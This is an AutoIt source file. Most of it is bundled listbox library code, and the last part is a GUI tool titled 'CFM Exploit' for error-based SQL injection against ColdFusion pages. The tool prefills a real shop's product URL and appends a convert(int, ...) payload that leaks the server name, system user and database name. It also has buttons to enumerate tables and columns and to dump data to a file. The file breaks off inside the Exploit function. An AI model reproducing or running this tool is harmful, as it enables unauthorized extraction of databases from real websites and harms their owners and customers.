Func _MultiByteToWideChar($s_Text, $i_CodePage = 0, $i_Flags = 1)
	Local $iBuffLen = StringLen($s_Text)
	Local $rUnicode = DllStructCreate("byte[" & ($iBuffLen * 2) & "]")
	Local $pUnicode = DllStructGetPtr($rUnicode)
	DllCall("Kernel32.dll", "int", "MultiByteToWideChar", "int", $i_CodePage, "int", $i_Flags, _
			"str", $s_Text, "int", $iBuffLen, "ptr", $pUnicode, "int", $iBuffLen * 2)
	If @error Then Return SetError(-1, -1, 0)
	Return DllStructGetData($rUnicode, 1)
EndFunc
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\Memory.au3>
; ----------------------------------------------------------------------------
Func _GUICtrlListAddDir($h_listbox, $s_Attributes, $s_file = "")
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	Local $i, $v_Attributes = "", $i_drives = 0, $no_brackets = 0, $v_ret
	Local $a_Attributes = StringSplit($s_Attributes, ",")
	For $i = 1 To $a_Attributes[0]
		Select
			Case StringUpper($a_Attributes[$i]) = "A"
				If (StringLen($v_Attributes) > 0) Then
					$v_Attributes = $v_Attributes + $DDL_ARCHIVE
				Else
					$v_Attributes = $DDL_ARCHIVE
				EndIf
			Case StringUpper($a_Attributes[$i]) = "D"
				If (StringLen($v_Attributes) > 0) Then
					$v_Attributes = $v_Attributes + $DDL_DIRECTORY
				Else
					$v_Attributes = $DDL_DIRECTORY
				EndIf
			Case StringUpper($a_Attributes[$i]) = "H"
				If (StringLen($v_Attributes) > 0) Then
					$v_Attributes = $v_Attributes + $DDL_HIDDEN
				Else
					$v_Attributes = $DDL_HIDDEN
				EndIf
			Case StringUpper($a_Attributes[$i]) = "RO"
				If (StringLen($v_Attributes) > 0) Then
					$v_Attributes = $v_Attributes + $DDL_READONLY
				Else
					$v_Attributes = $DDL_READONLY
				EndIf
			Case StringUpper($a_Attributes[$i]) = "RW"
				If (StringLen($v_Attributes) > 0) Then
					$v_Attributes = $v_Attributes + $DDL_READWRITE
				Else
					$v_Attributes = $DDL_READWRITE
				EndIf
			Case StringUpper($a_Attributes[$i]) = "S"
				If (StringLen($v_Attributes) > 0) Then
					$v_Attributes = $v_Attributes + $DDL_SYSTEM
				Else
					$v_Attributes = $DDL_SYSTEM
				EndIf
			Case StringUpper($a_Attributes[$i]) = "DRIVES"
				$i_drives = 1
				$s_file = ""
				If (StringLen($v_Attributes) > 0) Then
					$v_Attributes = $v_Attributes + $DDL_DRIVES
				Else
					$v_Attributes = $DDL_DRIVES
				EndIf
			Case StringUpper($a_Attributes[$i]) = "E"
				If (StringLen($v_Attributes) > 0) Then
					$v_Attributes = $v_Attributes + $DDL_EXCLUSIVE
				Else
					$v_Attributes = $DDL_EXCLUSIVE
				EndIf
			Case StringUpper($a_Attributes[$i]) = "NB"
				If (StringLen($v_Attributes) > 0) And StringInStr($s_Attributes, "DRIVES") Then
					$no_brackets = 1
				Else
					$no_brackets = 0
				EndIf
			Case Else
				Return $LB_ERRATTRIBUTE
		EndSelect
	Next
	If (Not $i_drives And StringLen($s_file) == 0) Then
		Return $LB_ERRREQUIRED
	EndIf
	If $i_drives And $no_brackets Then
		Local $s_text
		Local $gui_no_brackets = GUICreate("no brackets")
		Local $list_no_brackets = GUICtrlCreateList("", 240, 40, 120, 120)
		$v_ret = GUICtrlSendMsg($list_no_brackets, $LB_DIR, $v_Attributes, $s_file)
		For $i = 0 To _GUICtrlListCount($list_no_brackets) - 1
			$s_text = _GUICtrlListGetText($list_no_brackets, $i)
			$s_text = StringReplace(StringReplace(StringReplace($s_text, "[", ""), "]", ":"), "-", "")
			_GUICtrlListInsertItem($h_listbox, $s_text)
		Next
		GUIDelete($gui_no_brackets)
		Return $v_ret
	Else
		If IsHWnd($h_listbox) Then
			Return _SendMessage($h_listbox, $LB_DIR, $v_Attributes, $s_file, 0, "int", "str")
		Else
			Return GUICtrlSendMsg($h_listbox, $LB_DIR, $v_Attributes, $s_file)
		EndIf
	EndIf
EndFunc
Func _GUICtrlListAddItem($h_listbox, $s_text)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_ADDSTRING, 0, $s_text, 0, "int", "str")
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_ADDSTRING, 0, $s_text)
	EndIf
EndFunc
Func _GUICtrlListClear($h_listbox)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, 0)
	If IsHWnd($h_listbox) Then
		_SendMessage($h_listbox, $LB_RESETCONTENT)
	Else
		GUICtrlSendMsg($h_listbox, $LB_RESETCONTENT, 0, 0)
	EndIf
EndFunc
Func _GUICtrlListCount($h_listbox)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_GETCOUNT)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_GETCOUNT, 0, 0)
	EndIf
EndFunc
Func _GUICtrlListDeleteItem($h_listbox, $i_index)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_DELETESTRING, $i_index)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_DELETESTRING, $i_index, 0)
	EndIf
EndFunc
Func _GUICtrlListFindString($h_listbox, $s_search, $i_exact = 0)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		If ($i_exact) Then
			Return _SendMessage($h_listbox, $LB_FINDSTRINGEXACT, -1, $s_search, 0, "int", "str")
		Else
			Return _SendMessage($h_listbox, $LB_FINDSTRING, -1, $s_search, 0, "int", "str")
		EndIf
	Else
		If ($i_exact) Then
			Return GUICtrlSendMsg($h_listbox, $LB_FINDSTRINGEXACT, -1, $s_search)
		Else
			Return GUICtrlSendMsg($h_listbox, $LB_FINDSTRING, -1, $s_search)
		EndIf
	EndIf
EndFunc
Func _GUICtrlListGetAnchorIndex($h_listbox)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_GETANCHORINDEX)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_GETANCHORINDEX, 0, 0)
	EndIf
EndFunc
Func _GUICtrlListGetCaretIndex($h_listbox)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_GETCARETINDEX)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_GETCARETINDEX, 0, 0)
	EndIf
EndFunc
Func _GUICtrlListGetHorizontalExtent($h_listbox)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_GETHORIZONTALEXTENT)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_GETHORIZONTALEXTENT, 0, 0)
	EndIf
EndFunc
Func _GUICtrlListGetInfo($h_listbox)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_GETLISTBOXINFO)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_GETLISTBOXINFO, 0, 0)
	EndIf
EndFunc
Func _GUICtrlListGetItemRect($h_listbox, $i_index)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	#cs
		typedef struct _RECT {
		LONG left
		LONG top
		LONG right
		LONG bottom
		} RECT, *PRECT
	#ce
	Local $RECT = "int;int;int;int"
	Local $left = 1, $top = 2, $right = 3, $bottom = 4
	Local $p = DllStructCreate($RECT)
	If @error Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		If _SendMessage($h_listbox, $LB_GETITEMRECT, $i_index, DllStructGetPtr($p), 0, "int", "ptr") == $LB_ERR Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	Else
		If GUICtrlSendMsg($h_listbox, $LB_GETITEMRECT, $i_index, DllStructGetPtr($p)) == $LB_ERR Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	EndIf
	Return StringSplit(DllStructGetData($p, $left) & "," & DllStructGetData($p, $top) & "," & DllStructGetData($p, $right) & "," & DllStructGetData($p, $bottom), ",")
EndFunc
Func _GUICtrlListGetLocale($h_listbox)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return Hex(_SendMessage($h_listbox, $LB_GETLOCALE), 4)
	Else
		Return Hex(GUICtrlSendMsg($h_listbox, $LB_GETLOCALE, 0, 0), 4)
	EndIf
EndFunc
Func _GUICtrlListGetSelCount($h_listbox)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_GETSELCOUNT)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_GETSELCOUNT, 0, 0)
	EndIf
EndFunc
Func _GUICtrlListGetSelItems($h_listbox)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	Local $num = _GUICtrlListGetSelCount($h_listbox)
	Local $i, $struct, $i_ret
	For $i = 1 To $num
		$struct &= "int;"
	Next
	$struct = StringTrimRight($struct, 1)
	Local $p = DllStructCreate($struct)
	If @error Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		$i_ret = _SendMessage($h_listbox, $LB_GETSELITEMS, $num, DllStructGetPtr($p), 0, "int", "ptr")
	Else
		$i_ret = GUICtrlSendMsg($h_listbox, $LB_GETSELITEMS, $num, DllStructGetPtr($p))
	EndIf
	If ($i_ret == $LB_ERR Or $i_ret == 0) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	Local $array
	For $i = 1 To $num
		$array &= DllStructGetData($p, $i) & ","
	Next
	$array = StringTrimRight($array, 1)
	Local $a_items = StringSplit($array, ",")
	For $i = 1 To $a_items[0]
		$a_items[$i] = Int($a_items[$i])
	Next
	Return $a_items
EndFunc
Func _GUICtrlListGetSelItemsText($h_listbox)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	Local $i, $i_ret, $a_text
	For $i = 0 To _GUICtrlListCount($h_listbox) - 1
		$i_ret = _GUICtrlListGetSelState($h_listbox, $i)
		If ($i_ret > 0) Then
			If IsArray($a_text) Then
				ReDim $a_text[UBound($a_text) + 1]
			Else
				Local $a_text[2]
			EndIf
			$a_text[0] += 1
			$a_text[UBound($a_text) - 1] = _GUICtrlListGetText($h_listbox, $i)
		ElseIf ($i_ret == $LB_ERR) Then
			Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
		EndIf
	Next
	Return $a_text
EndFunc
Func _GUICtrlListGetSelState($h_listbox, $i_index)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_GETSEL, $i_index)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_GETSEL, $i_index, 0)
	EndIf
EndFunc
Func _GUICtrlListGetText($h_listbox, $i_index)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	Local $v_ret
	Local $struct = DllStructCreate("char[4096]")
	If @error Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If Not IsHWnd($h_listbox) Then $h_listbox = GUICtrlGetHandle($h_listbox)
	$v_ret = DllCall("user32.dll", "int", "SendMessageA", "hwnd", $h_listbox, "int", $LB_GETTEXT, "int", $i_index, "ptr", DllStructGetPtr($struct))
	If $v_ret[0] == $LB_ERR Or @error Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	Return DllStructGetData($struct, 1)
EndFunc
Func _GUICtrlListGetTextLen($h_listbox, $i_index)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_GETTEXTLEN, $i_index)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_GETTEXTLEN, $i_index, 0)
	EndIf
EndFunc
Func _GUICtrlListGetTopIndex($h_listbox)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If (Not _GUICtrlListCount($h_listbox)) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_GETTOPINDEX)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_GETTOPINDEX, 0, 0)
	EndIf
EndFunc
Func _GUICtrlListInsertItem($h_listbox, $s_text, $i_index = -1)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Local $struct_String = DllStructCreate("char[" & StringLen($s_text) + 1 & "]")
		Local $sBuffer_pointer = DllStructGetPtr($struct_String)
		DllStructSetData($struct_String, 1, $s_text)
		Local $rMemMap
		_MemInit ($h_listbox, StringLen($s_text) + 1, $rMemMap)
		If @error Then
			_MemFree ($rMemMap)
			Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
		EndIf
		_MemWrite ($rMemMap, $sBuffer_pointer)
		If @error Then
			_MemFree ($rMemMap)
			Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
		EndIf
		Local $iResult = _SendMessage($h_listbox, $LB_INSERTSTRING, $i_index, $sBuffer_pointer)
		If @error Then
			_MemFree ($rMemMap)
			Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
		EndIf
		_MemFree ($rMemMap)
		If @error Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
		Return $iResult
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_INSERTSTRING, $i_index, $s_text)
	EndIf
EndFunc
Func _GUICtrlListReplaceString($h_listbox, $i_index, $s_newString)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If (_GUICtrlListDeleteItem($h_listbox, $i_index) == $LB_ERR) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If (_GUICtrlListInsertItem($h_listbox, $s_newString, $i_index) == $LB_ERR) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
EndFunc
Func _GUICtrlListSelectIndex($h_listbox, $i_index)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_SETCURSEL, $i_index)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_SETCURSEL, $i_index, 0)
	EndIf
EndFunc
Func _GUICtrlListSelectedIndex($h_listbox)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_GETCURSEL)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_GETCURSEL, 0, 0)
	EndIf
EndFunc
Func _GUICtrlListSelectString($h_listbox, $s_search, $i_index = -1)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_SELECTSTRING, $i_index, $s_search, 0, "int", "str")
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_SELECTSTRING, $i_index, $s_search)
	EndIf
EndFunc
Func _GUICtrlListSelItemRange($h_listbox, $i_flag, $i_start, $i_stop)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_SELITEMRANGE, $i_flag, $i_stop * 65536 + $i_start)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_SELITEMRANGE, $i_flag, $i_stop * 65536 + $i_start)
	EndIf
EndFunc
Func _GUICtrlListSelItemRangeEx($h_listbox, $i_start, $i_stop)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_SELITEMRANGEEX, $i_start, $i_stop)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_SELITEMRANGEEX, $i_start, $i_stop)
	EndIf
EndFunc
Func _GUICtrlListSetAnchorIndex($h_listbox, $i_index)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_SETANCHORINDEX, $i_index)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_SETANCHORINDEX, $i_index, 0)
	EndIf
EndFunc
Func _GUICtrlListSetCaretIndex($h_listbox, $i_index, $i_bool = 1)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_SETCARETINDEX, $i_index, $i_bool)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_SETCARETINDEX, $i_index, $i_bool)
	EndIf
EndFunc
Func _GUICtrlListSetHorizontalExtent($h_listbox, $i_pixels)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		_SendMessage($h_listbox, $LB_SETHORIZONTALEXTENT, $i_pixels)
	Else
		GUICtrlSendMsg($h_listbox, $LB_SETHORIZONTALEXTENT, $i_pixels, 0)
	EndIf
EndFunc
Func _GUICtrlListSetLocale($h_listbox, $s_locale)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return Hex(_SendMessage($h_listbox, $LB_SETLOCALE, Dec($s_locale)), 4)
	Else
		Return Hex(GUICtrlSendMsg($h_listbox, $LB_SETLOCALE, Dec($s_locale), 0), 4)
	EndIf
EndFunc
Func _GUICtrlListSetSel($h_listbox, $i_flag = -1, $i_index = -1)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	Local $i_ret
	If IsHWnd($h_listbox) Then
		If $i_index == -1 Then
			For $i_index = 0 To _GUICtrlListCount($h_listbox) - 1
				$i_ret = _GUICtrlListGetSelState($h_listbox, $i_index)
				If ($i_ret == $LB_ERR) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
				If ($i_ret > 0) Then
					$i_ret = _SendMessage($h_listbox, $LB_SETSEL, 0, $i_index)
				Else
					$i_ret = _SendMessage($h_listbox, $LB_SETSEL, 1, $i_index)
				EndIf
				If ($i_ret == $LB_ERR) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
			Next
		ElseIf $i_flag == -1 Then
			If _GUICtrlListGetSelState($h_listbox, $i_index) Then
				Return _SendMessage($h_listbox, $LB_SETSEL, 0, $i_index)
			Else
				Return _SendMessage($h_listbox, $LB_SETSEL, 1, $i_index)
			EndIf
		Else
			Return _SendMessage($h_listbox, $LB_SETSEL, $i_flag, $i_index)
		EndIf
	Else
		If $i_index == -1 Then
			For $i_index = 0 To _GUICtrlListCount($h_listbox) - 1
				$i_ret = _GUICtrlListGetSelState($h_listbox, $i_index)
				If ($i_ret == $LB_ERR) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
				If ($i_ret > 0) Then
					$i_ret = GUICtrlSendMsg($h_listbox, $LB_SETSEL, 0, $i_index)
				Else
					$i_ret = GUICtrlSendMsg($h_listbox, $LB_SETSEL, 1, $i_index)
				EndIf
				If ($i_ret == $LB_ERR) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
			Next
		ElseIf $i_flag == -1 Then
			If _GUICtrlListGetSelState($h_listbox, $i_index) Then
				Return GUICtrlSendMsg($h_listbox, $LB_SETSEL, 0, $i_index)
			Else
				Return GUICtrlSendMsg($h_listbox, $LB_SETSEL, 1, $i_index)
			EndIf
		Else
			Return GUICtrlSendMsg($h_listbox, $LB_SETSEL, $i_flag, $i_index)
		EndIf
	EndIf
EndFunc
Func _GUICtrlListSetTopIndex($h_listbox, $i_index)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If IsHWnd($h_listbox) Then
		Return _SendMessage($h_listbox, $LB_SETTOPINDEX, $i_index)
	Else
		Return GUICtrlSendMsg($h_listbox, $LB_SETTOPINDEX, $i_index, 0)
	EndIf
EndFunc
Func _GUICtrlListSort($h_listbox)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	Local $bak = _GUICtrlListGetText($h_listbox, 0)
	If ($bak == $LB_ERR) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If (_GUICtrlListDeleteItem($h_listbox, 0) == $LB_ERR) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	Return _GUICtrlListAddItem($h_listbox, $bak)
EndFunc
Func _GUICtrlListSwapString($h_listbox, $i_indexA, $i_indexB)
	If Not _IsClassName ($h_listbox, "ListBox") Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	Local $itemA = _GUICtrlListGetText($h_listbox, $i_indexA)
	Local $itemB = _GUICtrlListGetText($h_listbox, $i_indexB)
	If ($itemA == $LB_ERR Or $itemB == $LB_ERR) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If (_GUICtrlListDeleteItem($h_listbox, $i_indexA) == $LB_ERR) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If (_GUICtrlListInsertItem($h_listbox, $itemB, $i_indexA) == $LB_ERR) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If (_GUICtrlListDeleteItem($h_listbox, $i_indexB) == $LB_ERR) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
	If (_GUICtrlListInsertItem($h_listbox, $itemA, $i_indexB) == $LB_ERR) Then Return SetError($LB_ERR, $LB_ERR, $LB_ERR)
EndFunc
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\GuiList.au3>
; ----------------------------------------------------------------------------
$mainwindow = GUICreate("CFM Exploit - longnhi", 900, 600)
GUISetOnEvent($GUI_EVENT_CLOSE, "CLOSEClicked")
GUICtrlCreateGroup("", 20, 10, 860, 80)
$Title = GUICtrlCreateLabel("CFM Exploit", 380, 35, 200, 30)
GUICtrlSetFont($Title, 20, 900)
$servernamelb = GUICtrlCreateLabel("Server Name:", 620, 22, 80)
$servername = GUICtrlCreateLabel("", 710, 22, 80)
$systemuserlb = GUICtrlCreateLabel("System User:", 620, 44, 80)
$systemuser = GUICtrlCreateLabel("", 710, 44, 110)
$dbnamelb = GUICtrlCreateLabel("Database Name:", 620, 66, 80)
$dbname = GUICtrlCreateLabel("", 710, 66, 110)
GUICtrlCreateGroup("", 30, 20, 80, 60)
$andrd = GUICtrlCreateRadio("and", 40, 30)
$orrd = GUICtrlCreateRadio("or", 40, 50)
GUICtrlSetState($andrd, $GUI_CHECKED)
GUICtrlCreateGroup("", 120, 20, 80, 60)
$hendrd = GUICtrlCreateRadio("--", 130, 30)
$nendrd = GUICtrlCreateRadio("not --", 130, 50)
GUICtrlSetState($hendrd, $GUI_CHECKED)
GUICtrlCreateGroup("", 210, 20, 80, 60)
$thanrd = GUICtrlCreateRadio(">", 220, 30)
$lessrd = GUICtrlCreateRadio("<", 260, 30)
$otherrd = GUICtrlCreateRadio("<>", 220, 50)
GUICtrlSetState($thanrd, $GUI_CHECKED)
GUICtrlCreateGroup("URL", 20, 100, 860, 105)
GUICtrlCreateLabel("Enter here: ", 30, 120)
$URL = GUICtrlCreateInput("http://www.verbaladvantage.com/shop/product_details.cfm?prod_ID=59", 85, 117, 680)
GUICtrlCreateLabel("Columns: ", 30, 150)
$Columns = GUICtrlCreateInput("Column1/Column2/../Columnn", 85, 147, 300)
GUICtrlCreateLabel("Delimiters: ", 395, 150)
$Delimiters = GUICtrlCreateInput("/", 450, 147, 40)
GUICtrlCreateLabel("Tables: ", 500, 150)
$Tables = GUICtrlCreateInput("table_name", 540, 147, 90)
GUICtrlCreateLabel("Order by: ", 640, 150)
$Orderby = GUICtrlCreateInput("column_name", 690, 147, 75)
$ShowQuery =  GUICtrlCreateEdit("", 85, 177, 680, 20, BitOR($ES_AUTOHSCROLL, $ES_AUTOVSCROLL, $ES_MULTILINE, $ES_READONLY))
$Exploitbt = GUICtrlCreateButton("Exploit", 780, 116, 80)
$BuildQuerybt = GUICtrlCreateButton("Build Query", 780, 147, 80)
GUICtrlCreateGroup("Table",  20, 210, 200, 375)
$Gettblbt = GUICtrlCreateButton("<< Get Tables >>", 30, 230, 180)
$Tableslst = GUICtrlCreateList("", 30, 260, 180, 260, $WS_HSCROLL)
$ftblinput = GUICtrlCreateInput("D:\Table_name.txt", 30, 520, 180, 20)
$Savetblbt = GUICtrlCreateButton("Save Tables", 30, 550, 80)
$Loadtblbt = GUICtrlCreateButton("Load Tables", 130, 550, 80)
GUICtrlCreateGroup("Column", 240, 210, 200, 375)
$Getclbt = GUICtrlCreateButton("<< Get Columns >>", 250, 230, 180)
$Columnslst = GUICtrlCreateList("", 250, 260, 180, 255, BitOR($LBS_MULTIPLESEL,$WS_BORDER,$WS_VSCROLL))
$fclinput = GUICtrlCreateInput("D:\Column_name.txt", 250, 520, 180, 20)
$Saveclbt = GUICtrlCreateButton("Save Columns", 250, 550, 80)
$Loadclbt = GUICtrlCreateButton("Load Columns", 350, 550, 80)
$transferbt = GUICtrlCreateButton(">>", 450, 360)
$upbt = GUICtrlCreateButton("^", 450, 330, 20)
$downbt = GUICtrlCreateButton("V", 450, 390, 20)
GUICtrlSetFont($upbt, 14)
GUICtrlSetFont($downbt, 8, 800)
GUICtrlCreateGroup("Data",   480, 210, 400, 375)
GUICtrlCreateGroup("Select Key", 490, 225, 380, 50)
$Key = GUICtrlCreateCombo("", 500, 243, 160)
$BuildSQLbt = GUICtrlCreateButton("Build SQL", 780, 240, 80)
$Numcb = GUICtrlCreateCheckbox("Num", 670, 243, 40, 20)
$Numinput = GUICtrlCreateInput("1",710, 243, 60, 20)
GUICtrlCreateGroup("Show SQL", 490, 280, 380, 90)
$ShowSQL = GUICtrlCreateEdit("", 500, 300, 360, 60, $ES_AUTOVSCROLL+$WS_VSCROLL)
$auto = GUICtrlCreateButton("Auto Get", 530, 380, 80)
$stop = GUICtrlCreateButton("Stop", 630, 380, 80)
$manual = GUICtrlCreateButton("Manual Get", 730, 380, 80)
GUICtrlCreateGroup("Show Data", 490, 410, 380, 130)
$ShowData = GUICtrlCreateEdit("", 500, 430, 360, 95)
GUICtrlCreateLabel("Path: ", 490, 556)
$path = GUICtrlCreateInput("D:\Shopdata.txt", 520, 553, 250)
$autogetnsave = GUICtrlCreateButton("Auto Get n Save", 784, 550)
GUICtrlSetState($Numcb, $GUI_CHECKED)
GUICtrlSetState($URL,$GUI_FOCUS)
GUISetState(@SW_SHOW)
$msg = 0
Const $maxvalue = 100
While $msg <> $GUI_EVENT_CLOSE
	$msg = GUIGetMsg()
	Select
		Case $msg = $Exploitbt
			Exploit()
		Case $msg = $BuildQuerybt
			BuildQuery()
		Case $msg = $Gettblbt
			Gettables()
		Case $msg = $Savetblbt
			Save($Tableslst, GUICtrlRead($ftblinput))
		Case $msg = $Loadtblbt
			Load($Tableslst, GUICtrlRead($ftblinput))
		Case $msg = $Getclbt
			GetColumns()
		Case $msg = $Saveclbt
			Save($Columnslst, GUICtrlRead($fclinput))
		Case $msg = $Loadclbt
			Load($Columnslst, GUICtrlRead($fclinput))
		Case $msg = $transferbt
			transfer()
		Case $msg = $BuildSQLbt
			If BuildSQL() <> "" Then
				If BitAND(GUICtrlRead($Numcb), $GUI_CHECKED) Then
					GUICtrlSetData($ShowSQL,StringReplace(BuildSQL(), "$/^*^/$", convertstr(GUICtrlRead($Numinput))))
				Else
					GUICtrlSetData($ShowSQL,BuildSQL())
				EndIf
			EndIf
		Case $msg = $auto
			AutoGet("Show")
		Case $msg = $manual
			ManualGet()
		Case $msg = $autogetnsave
			AutoGet("Save")
		Case $msg = $upbt
			Up()
		Case $msg = $downbt
			Down()
		Case $msg = $Numcb
			If BitAND(GUICtrlRead($Numcb), $GUI_CHECKED) Then
				GUICtrlSetStyle($Numinput, $GUI_SS_DEFAULT_INPUT)
			Else
				GUICtrlSetStyle($Numinput, $ES_READONLY)
			EndIf
	EndSelect
WEnd
Func Exploit()
	$sURL = GUICtrlRead($URL) & " " & andor() & " 1=convert(int,(select @@servername%2bchar(47)%2bsystem_user%2bchar(47)%2bdb_name()))" & hnend()
	$HTMLSource = GetHTML($sURL)
